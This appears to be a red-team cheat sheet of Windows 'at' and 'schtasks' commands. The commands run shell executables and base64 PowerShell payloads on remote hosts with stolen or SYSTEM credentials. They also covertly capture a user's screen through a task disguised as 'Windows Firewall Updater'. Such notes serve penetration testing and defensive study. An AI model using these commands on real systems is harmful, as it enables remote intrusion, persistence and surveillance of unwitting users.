# Schedule Periodic Tasks

## 01 - at

### 1.1 - Use Cases

```
C:\> net time \\<IP>

C:\> at <HH:mm> /interactive /every:m,t,w,th,f,s,su C:\path\to\shell.exe

C:\> at <HH:mm> powershell.exe -E <base64_payload>

C:\> at \\<IP>
```

## 02 - Schtasks

### 2.1 - Usage

```
C:\> schtasks /create /tn "<task_name>" /tr "<commands>" /sc once /st <HH:mm> /s <IP> /ru [DOMAIN]\<username> /rp <password>

C:\> schtasks /create /tn "<task_name>" /tr "<commands>" /sc once /st <HH:mm> /s <IP> /ru system
```

`/create` => create a schedule task
`/sc` => type of schedule
`/st` => start time
`/tn` => task name
`/tr` => task run
`/s` => computer IP
`/ru` => specify the {`[DOMAIN_name]\<username>|system`}
`/rp` => specify the password
`/it` => Make it interactive when the user is using his computer

### 2.2 - Use Cases

- Taking screenshots (Living off the Land)

```
C:\> net time \\<IP>

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock {Get-Date}

C:\> schtasks /create /sc once /st 00:00 /tn "Windows Firewall Updater" /tr "C:\Windows\System32\psr.exe /start /gui 0 /output C:\Users\<username>\out.zip" /s <ip> /ru <DOMAIN_NAME>\<username> /rp <password> /it

C:\> schtasks [/start|/run] /tn "Windows Firewall Updater" /s <IP>

C:\> schtasks /delete /f /tn "Windows Firewall Updater" /s <IP>

C:\> schtasks /query /tn "Windows Firewall Updater" /fo List /v /s <IP>
```

## References

- [Schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)